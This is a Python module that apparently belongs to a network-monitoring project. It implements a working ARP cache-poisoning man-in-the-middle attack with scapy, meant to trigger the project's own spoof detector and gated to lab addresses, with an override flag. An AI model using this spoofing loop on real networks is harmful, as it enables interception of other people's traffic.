"""ARP cache-poisoning MITM demo, gated to lab targets by :mod:`offensive.guard`.

This tool exists to trigger netwatch's own ARP-spoof detector
(:meth:`detect.alerts.AlertDetector.on_discovery`): run periodic discovery
against a lab target while this is running and the flapping-MAC heuristic
should fire a high-severity ``arp_spoof`` alert. Deliberately scoped to a
targeted MITM technique, not a volumetric flood/DoS tool.
"""

from __future__ import annotations

import time
from typing import Callable, Optional

from offensive.guard import require_lab_target


def build_arp_reply(dst_ip: str, dst_mac: str, spoof_ip: str, spoof_mac: str):
    """Build a forged ARP 'is-at' reply telling ``dst_ip`` that ``spoof_ip`` lives at ``spoof_mac``.

    Pure packet construction, no network I/O -- safe to call and inspect in tests.
    """
    from scapy.all import ARP, Ether

    return Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoof_ip, hwsrc=spoof_mac)


def get_mac(ip: str, iface: Optional[str] = None, timeout: float = 2.0) -> Optional[str]:
    """Resolve the MAC address for ``ip`` via a live ARP request. Needs privileges."""
    from scapy.all import ARP, Ether, srp

    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    kwargs = {"timeout": timeout, "verbose": False}
    if iface:
        kwargs["iface"] = iface
    answered, _ = srp(request, **kwargs)
    if not answered:
        return None
    return answered[0][1].hwsrc


def spoof(
    target_ip: str,
    gateway_ip: str,
    iface: Optional[str] = None,
    duration: float = 10.0,
    interval: float = 2.0,
    override: bool = False,
    send_fn: Optional[Callable] = None,
    sleep_fn: Callable[[float], None] = time.sleep,
    clock: Callable[[], float] = time.time,
) -> int:
    """Poison ``target_ip``'s and ``gateway_ip``'s ARP caches for ``duration`` seconds.

    Refuses both targets unless they are lab addresses (loopback/RFC1918/link-local)
    or ``override=True`` was passed. The guard check runs before any network call.
    Returns the number of forged reply pairs sent.
    """
    require_lab_target(target_ip, override=override)
    require_lab_target(gateway_ip, override=override)

    from scapy.all import conf, get_if_hwaddr, sendp

    send = send_fn or sendp
    attacker_iface = iface or conf.iface
    attacker_mac = get_if_hwaddr(attacker_iface)

    target_mac = get_mac(target_ip, iface=iface)
    gateway_mac = get_mac(gateway_ip, iface=iface)
    if target_mac is None or gateway_mac is None:
        raise RuntimeError(f"could not resolve MAC for {target_ip!r} or {gateway_ip!r}")

    sent_pairs = 0
    deadline = clock() + duration
    while clock() < deadline:
        send(build_arp_reply(target_ip, target_mac, gateway_ip, attacker_mac), verbose=False)
        send(build_arp_reply(gateway_ip, gateway_mac, target_ip, attacker_mac), verbose=False)
        sent_pairs += 1
        sleep_fn(interval)

    return sent_pairs
